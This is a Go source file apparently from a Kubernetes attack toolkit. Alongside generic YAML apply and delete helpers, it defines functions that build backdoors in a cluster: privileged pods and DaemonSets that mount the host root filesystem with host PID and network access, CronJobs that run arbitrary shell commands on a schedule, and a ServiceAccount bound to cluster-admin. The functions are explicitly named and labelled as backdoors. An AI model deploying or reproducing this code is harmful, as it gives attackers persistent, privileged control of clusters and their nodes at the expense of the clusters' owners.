package kubectl

import (
	"context"
	"fmt"
	"io"
	"strings"

	appsv1 "k8s.io/api/apps/v1"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	utilyaml "k8s.io/apimachinery/pkg/util/yaml"
	"k8s.io/client-go/dynamic"
	"sigs.k8s.io/yaml"
)

func (c *Client) ApplyYAML(ctx context.Context, yamlContent string) (string, error) {
	objects, err := decodeYAMLDocuments(yamlContent)
	if err != nil {
		return "", err
	}
	if len(objects) == 0 {
		return "", fmt.Errorf("no Kubernetes objects found in YAML")
	}

	dynamicClient, err := dynamic.NewForConfig(c.config)
	if err != nil {
		return "", fmt.Errorf("dynamic client: %w", err)
	}

	results := make([]string, 0, len(objects))
	for _, obj := range objects {
		gvk := obj.GetObjectKind().GroupVersionKind()
		if gvk.Kind == "" || gvk.Version == "" {
			return "", fmt.Errorf("YAML missing apiVersion/kind")
		}

		// GVR mapping
		resourceMap := map[string]string{
			"Pod": "pods", "Service": "services", "Secret": "secrets", "ConfigMap": "configmaps",
			"ServiceAccount": "serviceaccounts", "Deployment": "deployments", "DaemonSet": "daemonsets",
			"CronJob": "cronjobs", "Job": "jobs", "ClusterRoleBinding": "clusterrolebindings",
			"ClusterRole": "clusterroles", "RoleBinding": "rolebindings", "Role": "roles",
		}
		resource := resourceMap[gvk.Kind]
		if resource == "" {
			resource = strings.ToLower(gvk.Kind) + "s"
		}

		ns := obj.GetNamespace()
		dr := dynamicClient.Resource(gvk.GroupVersion().WithResource(resource)).Namespace(ns)
		_, err = dr.Create(ctx, obj, metav1.CreateOptions{})
		if err != nil {
			if !apierrors.IsAlreadyExists(err) {
				return "", fmt.Errorf("create %s/%s: %w", gvk.Kind, obj.GetName(), err)
			}
			existing, getErr := dr.Get(ctx, obj.GetName(), metav1.GetOptions{})
			if getErr != nil {
				return "", fmt.Errorf("get existing %s/%s: %w", gvk.Kind, obj.GetName(), getErr)
			}
			obj.SetResourceVersion(existing.GetResourceVersion())
			if _, err = dr.Update(ctx, obj, metav1.UpdateOptions{}); err != nil {
				return "", fmt.Errorf("update %s/%s: %w", gvk.Kind, obj.GetName(), err)
			}
			results = append(results, fmt.Sprintf("updated %s/%s in %s", gvk.Kind, obj.GetName(), ns))
			continue
		}
		results = append(results, fmt.Sprintf("created %s/%s in %s", gvk.Kind, obj.GetName(), ns))
	}
	return strings.Join(results, "\n"), nil
}

func decodeYAMLDocuments(yamlContent string) ([]*unstructured.Unstructured, error) {
	decoder := utilyaml.NewYAMLOrJSONDecoder(strings.NewReader(yamlContent), 4096)
	objects := make([]*unstructured.Unstructured, 0)
	for {
		raw := map[string]interface{}{}
		if err := decoder.Decode(&raw); err != nil {
			if err == io.EOF {
				break
			}
			return nil, fmt.Errorf("decode yaml document: %w", err)
		}
		if len(raw) == 0 {
			continue
		}
		objects = append(objects, &unstructured.Unstructured{Object: raw})
	}
	return objects, nil
}

type deleteTarget struct {
	Kind      string
	Name      string
	Namespace string
}

func decodeDeleteTargets(yamlContent string) ([]deleteTarget, error) {
	objects, err := decodeYAMLDocuments(yamlContent)
	if err != nil {
		return nil, err
	}
	if len(objects) == 0 {
		return nil, fmt.Errorf("no Kubernetes objects found in YAML")
	}
	targets := make([]deleteTarget, 0, len(objects))
	for _, obj := range objects {
		kind := obj.GetKind()
		name := obj.GetName()
		if kind == "" || name == "" {
			return nil, fmt.Errorf("YAML missing kind or metadata.name")
		}
		ns := obj.GetNamespace()
		if ns == "" && !isClusterScopedKind(kind) {
			ns = "default"
		}
		targets = append(targets, deleteTarget{
			Kind:      kind,
			Name:      name,
			Namespace: ns,
		})
	}
	return targets, nil
}

func isClusterScopedKind(kind string) bool {
	switch strings.ToLower(kind) {
	case "namespace", "namespaces", "clusterrole", "clusterroles", "clusterrolebinding", "clusterrolebindings":
		return true
	default:
		return false
	}
}

func (c *Client) DeleteYAML(ctx context.Context, yamlContent string) (string, error) {
	targets, err := decodeDeleteTargets(yamlContent)
	if err != nil {
		return "", err
	}

	results := make([]string, 0, len(targets))
	for _, target := range targets {
		err := c.DeleteResource(ctx, target.Kind, target.Name, target.Namespace)
		scope := target.Namespace
		if scope == "" {
			scope = "cluster-scope"
		}
		if err != nil {
			if apierrors.IsNotFound(err) {
				results = append(results, fmt.Sprintf("not found %s/%s in %s", target.Kind, target.Name, scope))
				continue
			}
			return strings.Join(results, "\n"), fmt.Errorf("delete %s/%s in %s: %w", target.Kind, target.Name, scope, err)
		}
		results = append(results, fmt.Sprintf("deleted %s/%s in %s", target.Kind, target.Name, scope))
	}
	return strings.Join(results, "\n"), nil
}

// CreatePrivilegedPod creates a privileged pod with host mounts
func (c *Client) CreatePrivilegedPod(ctx context.Context, namespace string, pod *corev1.Pod) (*corev1.Pod, error) {
	var privileged bool = true
	if pod.Spec.Containers[0].SecurityContext == nil {
		pod.Spec.Containers[0].SecurityContext = &corev1.SecurityContext{}
	}
	pod.Spec.Containers[0].SecurityContext.Privileged = &privileged
	pod.Spec.HostPID = true
	pod.Spec.HostNetwork = true
	return c.Clientset.CoreV1().Pods(namespace).Create(ctx, pod, metav1.CreateOptions{})
}

// CreateCronJob creates a CronJob backdoor
func (c *Client) CreateCronJob(ctx context.Context, namespace string, cronJob *batchv1.CronJob) (*batchv1.CronJob, error) {
	return c.Clientset.BatchV1().CronJobs(namespace).Create(ctx, cronJob, metav1.CreateOptions{})
}

// BuildBackdoorPod creates a privileged pod spec
func BuildBackdoorPod(name, namespace, image, mountPath, nodeName string) *corev1.Pod {
	var hostPathType corev1.HostPathType = corev1.HostPathDirectory
	pod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      name,
			Namespace: namespace,
			Labels:    map[string]string{"app": "backdoor"},
		},
		Spec: corev1.PodSpec{
			HostPID:     true,
			HostNetwork: true,
			Containers: []corev1.Container{{
				Name:    "backdoor",
				Image:   image,
				Command: []string{"/bin/sh"},
				Args:    []string{"-c", "while true; do sleep 3600; done"},
				VolumeMounts: []corev1.VolumeMount{{
					Name:      "host-root",
					MountPath: mountPath,
				}},
			}},
			Volumes: []corev1.Volume{{
				Name: "host-root",
				VolumeSource: corev1.VolumeSource{
					HostPath: &corev1.HostPathVolumeSource{
						Path: "/",
						Type: &hostPathType,
					},
				},
			}},
		},
	}
	return pod
}

// BuildCronJobBackdoor creates a CronJob backdoor spec
func BuildCronJobBackdoor(name, namespace, image, schedule, command string) *batchv1.CronJob {
	return &batchv1.CronJob{
		TypeMeta: metav1.TypeMeta{
			APIVersion: "batch/v1",
			Kind:       "CronJob",
		},
		ObjectMeta: metav1.ObjectMeta{
			Name:      name,
			Namespace: namespace,
		},
		Spec: batchv1.CronJobSpec{
			Schedule: schedule,
			JobTemplate: batchv1.JobTemplateSpec{
				Spec: batchv1.JobSpec{
					Template: corev1.PodTemplateSpec{
						Spec: corev1.PodSpec{
							Containers: []corev1.Container{{
								Name:    "backdoor",
								Image:   image,
								Command: []string{"/bin/sh"},
								Args:    []string{"-c", command},
							}},
							RestartPolicy: corev1.RestartPolicyOnFailure,
						},
					},
				},
			},
		},
	}
}

func BuildCronJobBackdoorYAML(name, namespace, image, schedule, command string) (string, error) {
	return marshalK8sYAML(BuildCronJobBackdoor(name, namespace, image, schedule, command))
}

// BuildDaemonSetBackdoorYAML creates a DaemonSet backdoor YAML.
func BuildDaemonSetBackdoorYAML(name, namespace, image, mountPath, command string) (string, error) {
	return marshalK8sYAML(buildDaemonSetBackdoorObject(name, namespace, image, mountPath, command))
}

func buildDaemonSetBackdoorObject(name, namespace, image, mountPath, command string) *appsv1.DaemonSet {
	privileged := true
	ds := &appsv1.DaemonSet{
		TypeMeta: metav1.TypeMeta{
			APIVersion: "apps/v1",
			Kind:       "DaemonSet",
		},
		ObjectMeta: metav1.ObjectMeta{
			Name:      name,
			Namespace: namespace,
		},
		Spec: appsv1.DaemonSetSpec{
			Selector: &metav1.LabelSelector{
				MatchLabels: map[string]string{"app": name},
			},
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{
					Labels: map[string]string{"app": name},
				},
				Spec: corev1.PodSpec{
					HostPID: true,
					Containers: []corev1.Container{{
						Name:    "backdoor",
						Image:   image,
						Command: []string{"/bin/sh"},
						Args:    []string{"-c", command},
						SecurityContext: &corev1.SecurityContext{
							Privileged: &privileged,
						},
					}},
				},
			},
		},
	}
	if mountPath != "" {
		var hostPathType corev1.HostPathType = corev1.HostPathDirectory
		ds.Spec.Template.Spec.Containers[0].VolumeMounts = []corev1.VolumeMount{{
			Name:      "host-root",
			MountPath: mountPath,
		}}
		ds.Spec.Template.Spec.Volumes = []corev1.Volume{{
			Name: "host-root",
			VolumeSource: corev1.VolumeSource{
				HostPath: &corev1.HostPathVolumeSource{
					Path: "/",
					Type: &hostPathType,
				},
			},
		}}
	}
	return ds
}

func marshalK8sYAML(obj interface{}) (string, error) {
	body, err := yaml.Marshal(obj)
	if err != nil {
		return "", fmt.Errorf("marshal yaml: %w", err)
	}
	return string(body), nil
}

// BuildAdminSAYAML creates YAML for a cluster-admin SA
func BuildAdminSAYAML(namespace, saName, bindingName string) (string, string) {
	saYAML := fmt.Sprintf(`apiVersion: v1
kind: ServiceAccount
metadata:
  name: %s
  namespace: %s
`, saName, namespace)
	bindingYAML := fmt.Sprintf(`apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: %s
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: %s
  namespace: %s
`, bindingName, saName, namespace)
	return saYAML, bindingYAML
}
